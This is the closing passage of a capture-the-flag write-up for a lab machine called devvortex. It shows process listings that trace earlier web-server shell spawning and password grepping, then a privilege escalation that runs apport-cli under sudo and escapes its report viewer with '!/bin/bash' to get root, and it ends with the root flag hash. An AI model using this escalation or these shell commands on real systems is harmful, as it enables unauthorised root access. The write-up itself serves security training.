root        1167  0.0  0.0      0     0 ?        I    12:39   0:04 [kworker/0:1-events]
www-data    1417  0.5  1.2 298120 48280 ?        S    13:36   0:35 php-fpm: pool www
www-data    1421  0.1  1.0 224080 41992 ?        S    13:38   0:10 php-fpm: pool www
www-data    1422  0.1  1.1 226188 44856 ?        S    13:38   0:09 php-fpm: pool www
www-data    1704  0.0  0.0   2608   528 ?        S    14:25   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data    1708  0.0  0.0   2608   600 ?        S    14:25   0:00 /bin/sh -i
www-data    1710  0.0  0.2  15956  9544 ?        S    14:27   0:00 python3 -c import pty;pty.spawn("/bin/bash")
www-data    1711  0.0  0.0   7436  3788 pts/0    Ss   14:27   0:00 /bin/bash
www-data    1761  0.0  0.0   6500   716 pts/0    S+   14:34   0:00 grep password
www-data    1781  0.0  0.0   2608   528 ?        S    14:36   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data    1785  0.0  0.0   2608   596 ?        S    14:36   0:00 /bin/sh -i
www-data    1786  0.0  0.2  15956  9568 ?        S    14:36   0:00 python3 -c import pty;pty.spawn("/bin/bash")
www-data    1787  0.0  0.0   7432  3732 pts/1    Ss+  14:36   0:00 /bin/bash
root        1904  0.0  0.2  13960  9184 ?        Ss   14:49   0:00 sshd: logan [priv]
logan       1921  0.0  0.2  19044  9636 ?        Ss   14:49   0:00 /lib/systemd/systemd --user
logan       1923  0.0  0.0 169216  3240 ?        S    14:49   0:00 (sd-pam)
root        1929  0.0  0.0      0     0 ?        I    14:49   0:00 [kworker/1:1-events]
logan       2027  0.0  0.1  13960  6024 ?        S    14:49   0:00 sshd: logan@pts/2
logan       2030  0.0  0.1   8272  5116 pts/2    Ss   14:49   0:00 -bash
root        2046  0.0  0.0      0     0 ?        I    14:49   0:00 [kworker/u4:2-events_unbound]
root        2094  0.0  0.0      0     0 ?        I    15:09   0:00 [kworker/1:2-mpt_poll_0]
root        2158  0.0  0.0      0     0 ?        I    15:09   0:00 [kworker/0:0-events]
root        2203  0.0  0.0      0     0 ?        I    15:12   0:00 [kworker/u4:1-events_unbound]
logan       2225  0.0  0.0   9080  3476 pts/2    R+   15:19   0:00 ps -aux
logan@devvortex:~$ ps -aux | grep systemd
root         379  0.0  0.4  63152 16904 ?        S<s  12:33   0:01 /lib/systemd/systemd-journald
root         412  0.0  0.1  22500  5992 ?        Ss   12:33   0:00 /lib/systemd/systemd-udevd
systemd+     562  0.0  0.1  90884  6104 ?        Ssl  12:33   0:00 /lib/systemd/systemd-timesyncd
message+     636  0.0  0.1   7384  4496 ?        Ss   12:33   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         660  0.0  0.1  17352  7580 ?        Ss   12:33   0:00 /lib/systemd/systemd-logind
systemd+     777  0.0  0.3  24708 13216 ?        Ss   12:33   0:01 /lib/systemd/systemd-resolved
logan       1921  0.0  0.2  19044  9636 ?        Ss   14:49   0:00 /lib/systemd/systemd --user
logan       2227  0.0  0.0   6432   720 pts/2    R+   15:19   0:00 grep --color=auto systemd

```


The report got created and we were able to view the report.


```
logan@devvortex:~$ sudo /usr/bin/apport-cli -f -P 1921

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
......
*** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y

*** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): 

What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): Y
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (736.3 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan#
```

We gained root shell, by prompting !/bin/bash after pressing "View Report".

Retrieved root.txt in /root directory.

```
f33825a439a2736811087f26e5eea9b9
```
